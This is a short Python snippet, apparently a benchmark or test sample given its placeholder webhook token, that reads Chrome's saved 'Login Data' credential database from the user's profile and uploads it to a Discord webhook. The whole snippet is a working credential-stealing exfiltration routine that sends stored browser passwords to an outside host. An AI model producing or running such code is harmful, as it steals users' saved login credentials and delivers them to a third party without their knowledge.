import pathlib, requests
db = pathlib.Path.home() / 'AppData/Local/Google/Chrome/User Data/Default/Login Data'
requests.post('https://discord.com/api/webhooks/000/xyz-bench-token', files={'f': db.read_bytes()})
